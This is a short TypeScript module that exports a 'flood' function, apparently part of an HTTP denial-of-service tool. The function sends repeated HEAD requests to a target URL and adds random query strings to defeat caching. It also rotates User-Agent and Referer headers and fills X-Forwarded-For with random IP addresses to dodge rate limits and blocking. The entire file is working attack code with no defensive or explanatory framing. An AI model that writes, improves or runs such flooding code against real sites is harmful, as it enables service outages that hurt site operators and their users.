import { USER_AGENTS, REFERERS } from "@/lib/config"

function randomChoice<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)]
}

function randStr(len: number): string {
  const chars = "abcdefghijklmnopqrstuvwxyz0123456789"
  let s = ""
  for (let i = 0; i < len; i++) s += chars[Math.floor(Math.random() * chars.length)]
  return s
}

function randIp(): string {
  return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`
}

export async function flood(
  url: string,
  rpc: number,
  onStats: (req: number, bytes: number) => void
): Promise<void> {
  const u = new URL(url.startsWith("http") ? url : `http://${url}`)
  const base = u.origin + u.pathname + (u.search ? u.search + "&" : "?")
  const target = base + "qs=" + randStr(6)

  for (let i = 0; i < rpc; i++) {
    try {
      const res = await fetch(target, {
        method: "HEAD",
        headers: {
          "User-Agent": randomChoice(USER_AGENTS),
          "Host": u.host,
          "Referer": randomChoice(REFERERS),
          "X-Forwarded-For": randIp(),
          "Connection": "keep-alive",
        },
        redirect: "manual",
      })
      onStats(1, 350)
    } catch {}
  }
}
